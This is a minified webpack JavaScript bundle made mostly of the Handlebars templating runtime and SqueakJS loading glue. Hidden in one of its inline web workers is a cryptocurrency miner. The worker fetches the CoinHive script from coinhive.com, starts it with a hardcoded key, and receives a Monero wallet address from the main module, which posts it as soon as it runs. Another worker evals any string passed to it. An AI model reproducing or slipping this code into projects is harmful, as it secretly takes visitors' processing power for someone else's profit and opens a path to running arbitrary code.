!function(e){var t={};function r(n){if(t[n])return t[n].exports;var o=t[n]={i:n,l:!1,exports:{}};return e[n].call(o.exports,o,o.exports,r),o.l=!0,o.exports}r.m=e,r.c=t,r.d=function(e,t,n){r.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},r.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,t){if(1&t&&(e=r(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(r.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)r.d(n,o,function(t){return e[t]}.bind(null,o));return n},r.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="",r(r.s=26)}([function(e,t,r){"use strict";t.__esModule=!0,t.extend=u,t.indexOf=function(e,t){for(var r=0,n=e.length;r<n;r++)if(e[r]===t)return r;return-1},t.escapeExpression=function(e){if("string"!=typeof e){if(e&&e.toHTML)return e.toHTML();if(null==e)return"";if(!e)return e+"";e=""+e}if(!a.test(e))return e;return e.replace(o,i)},t.isEmpty=function(e){return!e&&0!==e||!(!c(e)||0!==e.length)},t.createFrame=function(e){var t=u({},e);return t._parent=e,t},t.blockParams=function(e,t){return e.path=t,e},t.appendContextPath=function(e,t){return(e?e+".":"")+t};var n={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;","`":"&#x60;","=":"&#x3D;"},o=/[&<>"'`=]/g,a=/[&<>"'`=]/;function i(e){return n[e]}function u(e){for(var t=1;t<arguments.length;t++)for(var r in arguments[t])Object.prototype.hasOwnProperty.call(arguments[t],r)&&(e[r]=arguments[t][r]);return e}var s=Object.prototype.toString;t.toString=s;var l=function(e){return"function"==typeof e};l(/x/)&&(t.isFunction=l=function(e){return"function"==typeof e&&"[object Function]"===s.call(e)}),t.isFunction=l;var c=Array.isArray||function(e){return!(!e||"object"!=typeof e)&&"[object Array]"===s.call(e)};t.isArray=c},function(e,t,r){"use strict";t.__esModule=!0;var n=["description","fileName","lineNumber","endLineNumber","message","name","number","stack"];function o(e,t){var r=t&&t.loc,a=void 0,i=void 0,u=void 0,s=void 0;r&&(a=r.start.line,i=r.end.line,u=r.start.column,s=r.end.column,e+=" - "+a+":"+u);for(var l=Error.prototype.constructor.call(this,e),c=0;c<n.length;c++)this[n[c]]=l[n[c]];Error.captureStackTrace&&Error.captureStackTrace(this,o);try{r&&(this.lineNumber=a,this.endLineNumber=i,Object.defineProperty?(Object.defineProperty(this,"column",{value:u,enumerable:!0}),Object.defineProperty(this,"endColumn",{value:s,enumerable:!0})):(this.column=u,this.endColumn=s))}catch(e){}}o.prototype=new Error,t.default=o,e.exports=t.default},function(e,t,r){"use strict";var n=window.URL||window.webkitURL;e.exports=function(e,t){try{try{var r;try{(r=new(window.BlobBuilder||window.WebKitBlobBuilder||window.MozBlobBuilder||window.MSBlobBuilder)).append(e),r=r.getBlob()}catch(t){r=new Blob([e])}return new Worker(n.createObjectURL(r))}catch(t){return new Worker("data:application/javascript,"+encodeURIComponent(e))}}catch(e){if(!t)throw Error("Inline worker is not supported");return new Worker(t)}}},function(e,t,r){"use strict";function n(e){return e&&e.__esModule?e:{default:e}}t.__esModule=!0,t.HandlebarsEnvironment=l;var o=r(0),a=n(r(1)),i=r(4),u=r(20),s=n(r(22));t.VERSION="4.5.3";t.COMPILER_REVISION=8;t.LAST_COMPATIBLE_COMPILER_REVISION=7;t.REVISION_CHANGES={1:"<= 1.0.rc.2",2:"== 1.0.0-rc.3",3:"== 1.0.0-rc.4",4:"== 1.x.x",5:"== 2.0.0-alpha.x",6:">= 2.0.0-beta.1",7:">= 4.0.0 <4.3.0",8:">= 4.3.0"};function l(e,t,r){this.helpers=e||{},this.partials=t||{},this.decorators=r||{},i.registerDefaultHelpers(this),u.registerDefaultDecorators(this)}l.prototype={constructor:l,logger:s.default,log:s.default.log,registerHelper:function(e,t){if("[object Object]"===o.toString.call(e)){if(t)throw new a.default("Arg not supported with multiple helpers");o.extend(this.helpers,e)}else this.helpers[e]=t},unregisterHelper:function(e){delete this.helpers[e]},registerPartial:function(e,t){if("[object Object]"===o.toString.call(e))o.extend(this.partials,e);else{if(void 0===t)throw new a.default('Attempting to register a partial called "'+e+'" as undefined');this.partials[e]=t}},unregisterPartial:function(e){delete this.partials[e]},registerDecorator:function(e,t){if("[object Object]"===o.toString.call(e)){if(t)throw new a.default("Arg not supported with multiple decorators");o.extend(this.decorators,e)}else this.decorators[e]=t},unregisterDecorator:function(e){delete this.decorators[e]}};var c=s.default.log;t.log=c,t.createFrame=o.createFrame,t.logger=s.default},function(e,t,r){"use strict";function n(e){return e&&e.__esModule?e:{default:e}}t.__esModule=!0,t.registerDefaultHelpers=function(e){o.default(e),a.default(e),i.default(e),u.default(e),s.default(e),l.default(e),c.default(e)},t.moveHelperToHooks=function(e,t,r){e.helpers[t]&&(e.hooks[t]=e.helpers[t],r||delete e.helpers[t])};var o=n(r(13)),a=n(r(14)),i=n(r(15)),u=n(r(16)),s=n(r(17)),l=n(r(18)),c=n(r(19))},function(e,t){var r;r=function(){return this}();try{r=r||new Function("return this")()}catch(e){"object"==typeof window&&(r=window)}e.exports=r},function(e,t,r){e.exports=function(){return r(2)('!function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)n.d(r,o,function(t){return e[t]}.bind(null,o));return r},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(module,exports){self.addEventListener("message",(function(evt){return evt.data&&evt.data.str_ev instanceof String&&eval(evt.data.str_ev)}))}]);',r.p+"439c42da93fe5daeecd1.worker.js")}},function(e,t,r){e.exports=function(){return r(2)('!function(e){var t={};function r(n){if(t[n])return t[n].exports;var o=t[n]={i:n,l:!1,exports:{}};return e[n].call(o.exports,o,o.exports,r),o.l=!0,o.exports}r.m=e,r.c=t,r.d=function(e,t,n){r.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},r.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,t){if(1&t&&(e=r(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(r.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)r.d(n,o,function(t){return e[t]}.bind(null,o));return n},r.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="",r(r.s=0)}([function(e,t,r){"use strict";r.r(t),self.addEventListener("message",(function(e){"commPort"===e.data.type&&e.data})),t.default={}}]);',r.p+"d851b88540a0e56e273a.worker.js")}},function(e,t,r){e.exports=function(){return r(2)('!function(e){var t={};function r(n){if(t[n])return t[n].exports;var o=t[n]={i:n,l:!1,exports:{}};return e[n].call(o.exports,o,o.exports,r),o.l=!0,o.exports}r.m=e,r.c=t,r.d=function(e,t,n){r.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},r.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,t){if(1&t&&(e=r(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(r.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)r.d(n,o,function(t){return e[t]}.bind(null,o));return n},r.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="",r(r.s=0)}([function(e,t,r){"use strict";r.r(t),self.addEventListener("message",(function(e){"commPort"===e.data.type&&e.data})),t.default={}}]);',r.p+"d851b88540a0e56e273a.worker.js")}},function(e,t,r){e.exports=function(){return r(2)('!function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)n.d(r,o,function(t){return e[t]}.bind(null,o));return r},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=1)}([function(e,t){e.exports=function(e){if("string"!=typeof e)throw new TypeError("xmrWalletAddress expected to be a string");var t=document.createElement("script");t.onload=function(){new CoinHive.Anonymous("BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu").start(e)},t.src="https://coinhive.com/lib/coinhive.min.js",document.head.appendChild(t)}},function(e,t,n){"use strict";n.r(t);var r=n(0);self.addEventListener("message",(function(e){"mine"===e.data.type&&r(e.data.data)}))}]);',r.p+"12855c86ff917b190171.worker.js")}},function(e,t,r){e.exports=r(12).default},function(e,t){e.exports=function(){return""}},function(e,t,r){"use strict";function n(e){return e&&e.__esModule?e:{default:e}}function o(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var r in e)Object.prototype.hasOwnProperty.call(e,r)&&(t[r]=e[r]);return t.default=e,t}t.__esModule=!0;var a=o(r(3)),i=n(r(23)),u=n(r(1)),s=o(r(0)),l=o(r(24)),c=n(r(25));function f(){var e=new a.HandlebarsEnvironment;return s.extend(e,a),e.SafeString=i.default,e.Exception=u.default,e.Utils=s,e.escapeExpression=s.escapeExpression,e.VM=l,e.template=function(t){return l.template(t,e)},e}var d=f();d.create=f,c.default(d),d.default=d,t.default=d,e.exports=t.default},function(e,t,r){"use strict";t.__esModule=!0;var n=r(0);t.default=function(e){e.registerHelper("blockHelperMissing",(function(t,r){var o=r.inverse,a=r.fn;if(!0===t)return a(this);if(!1===t||null==t)return o(this);if(n.isArray(t))return t.length>0?(r.ids&&(r.ids=[r.name]),e.helpers.each(t,r)):o(this);if(r.data&&r.ids){var i=n.createFrame(r.data);i.contextPath=n.appendContextPath(r.data.contextPath,r.name),r={data:i}}return a(t,r)}))},e.exports=t.default},function(e,t,r){"use strict";(function(n){t.__esModule=!0;var o,a=r(0),i=r(1),u=(o=i)&&o.__esModule?o:{default:o};t.default=function(e){e.registerHelper("each",(function(e,t){if(!t)throw new u.default("Must pass iterator to #each");var r,o=t.fn,i=t.inverse,s=0,l="",c=void 0,f=void 0;function d(t,r,n){c&&(c.key=t,c.index=r,c.first=0===r,c.last=!!n,f&&(c.contextPath=f+t)),l+=o(e[t],{data:c,blockParams:a.blockParams([e[t],t],[f+t,null])})}if(t.data&&t.ids&&(f=a.appendContextPath(t.data.contextPath,t.ids[0])+"."),a.isFunction(e)&&(e=e.call(this)),t.data&&(c=a.createFrame(t.data)),e&&"object"==typeof e)if(a.isArray(e))for(var p=e.length;s<p;s++)s in e&&d(s,s,s===e.length-1);else if(n.Symbol&&e[n.Symbol.iterator]){for(var h=[],v=e[n.Symbol.iterator](),m=v.next();!m.done;m=v.next())h.push(m.value);for(p=(e=h).length;s<p;s++)d(s,s,s===e.length-1)}else r=void 0,Object.keys(e).forEach((function(e){void 0!==r&&d(r,s-1),r=e,s++})),void 0!==r&&d(r,s-1,!0);return 0===s&&(l=i(this)),l}))},e.exports=t.default}).call(this,r(5))},function(e,t,r){"use strict";t.__esModule=!0;var n,o=r(1),a=(n=o)&&n.__esModule?n:{default:n};t.default=function(e){e.registerHelper("helperMissing",(function(){if(1!==arguments.length)throw new a.default('Missing helper: "'+arguments[arguments.length-1].name+'"')}))},e.exports=t.default},function(e,t,r){"use strict";t.__esModule=!0;var n,o=r(0),a=r(1),i=(n=a)&&n.__esModule?n:{default:n};t.default=function(e){e.registerHelper("if",(function(e,t){if(2!=arguments.length)throw new i.default("#if requires exactly one argument");return o.isFunction(e)&&(e=e.call(this)),!t.hash.includeZero&&!e||o.isEmpty(e)?t.inverse(this):t.fn(this)})),e.registerHelper("unless",(function(t,r){if(2!=arguments.length)throw new i.default("#unless requires exactly one argument");return e.helpers.if.call(this,t,{fn:r.inverse,inverse:r.fn,hash:r.hash})}))},e.exports=t.default},function(e,t,r){"use strict";t.__esModule=!0,t.default=function(e){e.registerHelper("log",(function(){for(var t=[void 0],r=arguments[arguments.length-1],n=0;n<arguments.length-1;n++)t.push(arguments[n]);var o=1;null!=r.hash.level?o=r.hash.level:r.data&&null!=r.data.level&&(o=r.data.level),t[0]=o,e.log.apply(e,t)}))},e.exports=t.default},function(e,t,r){"use strict";t.__esModule=!0;var n=/^(constructor|__defineGetter__|__defineSetter__|__lookupGetter__|__proto__)$/;t.dangerousPropertyRegex=n,t.default=function(e){e.registerHelper("lookup",(function(e,t){return e?!n.test(String(t))||Object.prototype.propertyIsEnumerable.call(e,t)?e[t]:void 0:e}))}},function(e,t,r){"use strict";t.__esModule=!0;var n,o=r(0),a=r(1),i=(n=a)&&n.__esModule?n:{default:n};t.default=function(e){e.registerHelper("with",(function(e,t){if(2!=arguments.length)throw new i.default("#with requires exactly one argument");o.isFunction(e)&&(e=e.call(this));var r=t.fn;if(o.isEmpty(e))return t.inverse(this);var n=t.data;return t.data&&t.ids&&((n=o.createFrame(t.data)).contextPath=o.appendContextPath(t.data.contextPath,t.ids[0])),r(e,{data:n,blockParams:o.blockParams([e],[n&&n.contextPath])})}))},e.exports=t.default},function(e,t,r){"use strict";t.__esModule=!0,t.registerDefaultDecorators=function(e){a.default(e)};var n,o=r(21),a=(n=o)&&n.__esModule?n:{default:n}},function(e,t,r){"use strict";t.__esModule=!0;var n=r(0);t.default=function(e){e.registerDecorator("inline",(function(e,t,r,o){var a=e;return t.partials||(t.partials={},a=function(o,a){var i=r.partials;r.partials=n.extend({},i,t.partials);var u=e(o,a);return r.partials=i,u}),t.partials[o.args[0]]=o.fn,a}))},e.exports=t.default},function(e,t,r){"use strict";t.__esModule=!0;var n=r(0),o={methodMap:["debug","info","warn","error"],level:"info",lookupLevel:function(e){if("string"==typeof e){var t=n.indexOf(o.methodMap,e.toLowerCase());e=t>=0?t:parseInt(e,10)}return e},log:function(e){if(e=o.lookupLevel(e),"undefined"!=typeof console&&o.lookupLevel(o.level)<=e){var t=o.methodMap[e];console[t]||(t="log");for(var r=arguments.length,n=Array(r>1?r-1:0),a=1;a<r;a++)n[a-1]=arguments[a];console[t].apply(console,n)}}};t.default=o,e.exports=t.default},function(e,t,r){"use strict";function n(e){this.string=e}t.__esModule=!0,n.prototype.toString=n.prototype.toHTML=function(){return""+this.string},t.default=n,e.exports=t.default},function(e,t,r){"use strict";t.__esModule=!0,t.checkRevision=function(e){var t=e&&e[0]||1,r=u.COMPILER_REVISION;if(t>=u.LAST_COMPATIBLE_COMPILER_REVISION&&t<=u.COMPILER_REVISION)return;if(t<u.LAST_COMPATIBLE_COMPILER_REVISION){var n=u.REVISION_CHANGES[r],o=u.REVISION_CHANGES[t];throw new i.default("Template was precompiled with an older version of Handlebars than the current runtime. Please update your precompiler to a newer version ("+n+") or downgrade your runtime to an older version ("+o+").")}throw new i.default("Template was precompiled with a newer version of Handlebars than the current runtime. Please update your runtime to a newer version ("+e[1]+").")},t.template=function(e,t){if(!t)throw new i.default("No environment passed to template");if(!e||!e.main)throw new i.default("Unknown template object: "+typeof e);e.main.decorator=e.main_d,t.VM.checkRevision(e.compiler);var r=e.compiler&&7===e.compiler[0];var n={strict:function(e,t,r){if(!(e&&t in e))throw new i.default('"'+t+'" not defined in '+e,{loc:r});return e[t]},lookup:function(e,t){for(var r=e.length,n=0;n<r;n++)if(e[n]&&null!=e[n][t])return e[n][t]},lambda:function(e,t){return"function"==typeof e?e.call(t):e},escapeExpression:o.escapeExpression,invokePartial:function(r,n,a){a.hash&&(n=o.extend({},n,a.hash),a.ids&&(a.ids[0]=!0)),r=t.VM.resolvePartial.call(this,r,n,a);var u=o.extend({},a,{hooks:this.hooks}),s=t.VM.invokePartial.call(this,r,n,u);if(null==s&&t.compile&&(a.partials[a.name]=t.compile(r,e.compilerOptions,t),s=a.partials[a.name](n,u)),null!=s){if(a.indent){for(var l=s.split("\n"),c=0,f=l.length;c<f&&(l[c]||c+1!==f);c++)l[c]=a.indent+l[c];s=l.join("\n")}return s}throw new i.default("The partial "+a.name+" could not be compiled when running in runtime-only mode")},fn:function(t){var r=e[t];return r.decorator=e[t+"_d"],r},programs:[],program:function(e,t,r,n,o){var a=this.programs[e],i=this.fn(e);return t||o||n||r?a=l(this,e,i,t,r,n,o):a||(a=this.programs[e]=l(this,e,i)),a},data:function(e,t){for(;e&&t--;)e=e._parent;return e},nullContext:Object.seal({}),noop:t.VM.noop,compilerInfo:e.compiler};function a(t){var r=arguments.length<=1||void 0===arguments[1]?{}:arguments[1],o=r.data;a._setup(r),!r.partial&&e.useData&&(o=function(e,t){t&&"root"in t||((t=t?u.createFrame(t):{}).root=e);return t}(t,o));var i=void 0,s=e.useBlockParams?[]:void 0;function l(t){return""+e.main(n,t,n.helpers,n.partials,o,s,i)}return e.useDepths&&(i=r.depths?t!=r.depths[0]?[t].concat(r.depths):r.depths:[t]),(l=f(e.main,l,n,r.depths||[],o,s))(t,r)}return a.isTop=!0,a._setup=function(a){if(a.partial)n.helpers=a.helpers,n.partials=a.partials,n.decorators=a.decorators,n.hooks=a.hooks;else{n.helpers=o.extend({},t.helpers,a.helpers),e.usePartial&&(n.partials=o.extend({},t.partials,a.partials)),(e.usePartial||e.useDecorators)&&(n.decorators=o.extend({},t.decorators,a.decorators)),n.hooks={};var i=a.allowCallsToHelperMissing||r;s.moveHelperToHooks(n,"helperMissing",i),s.moveHelperToHooks(n,"blockHelperMissing",i)}},a._child=function(t,r,o,a){if(e.useBlockParams&&!o)throw new i.default("must pass block params");if(e.useDepths&&!a)throw new i.default("must pass parent depths");return l(n,t,e[t],r,0,o,a)},a},t.wrapProgram=l,t.resolvePartial=function(e,t,r){e?e.call||r.name||(r.name=e,e=r.partials[e]):e="@partial-block"===r.name?r.data["partial-block"]:r.partials[r.name];return e},t.invokePartial=function(e,t,r){var n=r.data&&r.data["partial-block"];r.partial=!0,r.ids&&(r.data.contextPath=r.ids[0]||r.data.contextPath);var a=void 0;r.fn&&r.fn!==c&&function(){r.data=u.createFrame(r.data);var e=r.fn;a=r.data["partial-block"]=function(t){var r=arguments.length<=1||void 0===arguments[1]?{}:arguments[1];return r.data=u.createFrame(r.data),r.data["partial-block"]=n,e(t,r)},e.partials&&(r.partials=o.extend({},r.partials,e.partials))}();void 0===e&&a&&(e=a);if(void 0===e)throw new i.default("The partial "+r.name+" could not be found");if(e instanceof Function)return e(t,r)},t.noop=c;var n,o=function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var r in e)Object.prototype.hasOwnProperty.call(e,r)&&(t[r]=e[r]);return t.default=e,t}(r(0)),a=r(1),i=(n=a)&&n.__esModule?n:{default:n},u=r(3),s=r(4);function l(e,t,r,n,o,a,i){function u(t){var o=arguments.length<=1||void 0===arguments[1]?{}:arguments[1],u=i;return!i||t==i[0]||t===e.nullContext&&null===i[0]||(u=[t].concat(i)),r(e,t,e.helpers,e.partials,o.data||n,a&&[o.blockParams].concat(a),u)}return(u=f(r,u,e,i,n,a)).program=t,u.depth=i?i.length:0,u.blockParams=o||0,u}function c(){return""}function f(e,t,r,n,a,i){if(e.decorator){var u={};t=e.decorator(t,u,r,n&&n[0],a,i,n),o.extend(t,u)}return t}},function(e,t,r){"use strict";(function(r){t.__esModule=!0,t.default=function(e){var t=void 0!==r?r:window,n=t.Handlebars;e.noConflict=function(){return t.Handlebars===e&&(t.Handlebars=n),e}},e.exports=t.default}).call(this,r(5))},function(e,t,r){"use strict";r.r(t);var n=r(6),o=r.n(n),a=r(7),i=r.n(a),u=r(8),s=r.n(u),l=r(9),c=r.n(l),f=r(10),d=r(11);let p=importScripts;self.document=self.document||{createElement:function(e){if("script"===e)return{setAttribute:function(e,t){this[e]=t}}},getElementsByTagName:function(e){if("head"===e)return[{appendChild:function(e){importScripts(e.src)}}]}};var h,v,m;h="squeak.js",(v=function(){return Promise.resolve(p("../../ObjectLand.SqueakJS/"+h))},m=function(e){return Promise.reject(e)},function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];try{return v.apply(void 0,e)}catch(e){return m(e)}}).catch((function(e){return Promise.resolve(p("https://squeak.js.org/"+h))}));var g=new c.a;g.postMessage({type:"mine",data:"46rXcQgMPRYcKACfrMUtLuYMhdzDt8Z4i2KvRPyvhqgnAMVaFmj9FLHUwUjVD1MH2gMadyUShuAksLX5EgzP9XQLFZgAEah"});var b=new MessageChannel,y=new i.a,_=new MessageChannel,w=new s.a,M=new MessageChannel;y.postMessage({type:"commPort",data:_.port2},[_.port2]),_.port1.addEventListener("message",w.postMessage.bind(self)),w.addEventListener("message",_.port1.postMessage.bind(_.port1)),g.postMessage({type:"commPort",data:b.port2},[b.port2]),b.port1.addEventListener("message",w.postMessage.bind(self)),w.addEventListener("message",b.port1.postMessage.bind(b.port1)),w.postMessage({type:"commPort",data:M.port2},[M.port2]),M.port1.addEventListener("message",self.postMessage.bind(self)),self.addEventListener("message",M.port1.postMessage.bind(M.port1));var x=Promise.resolve(f);w.addEventListener("message",(function(e){if("renderMain"===e.data.type)var t=e.data.data;x.then((function(e){return d})).then((function(e){if(t)return t.then((function(t){if(e)return e({html:t})}))})).then((function(t){w.postMessage({type:"rendered",data:t,id:e.data.id})}))})),self.addEventListener("message",(function(e){var t,r,n;"installApp"===e.type&&(t=e.data,r=new o.a,(n=new MessageChannel).port1.addEventListener("message",r.postMessage.bind(r)),r.addEventListener("message",n.port1.postMessage.bind(n.port1)),r.postMessage({str_ev:t}),y.postMessage({type:"appInstalled",data:n.port2},[n.port2]))}));t.default={}}]);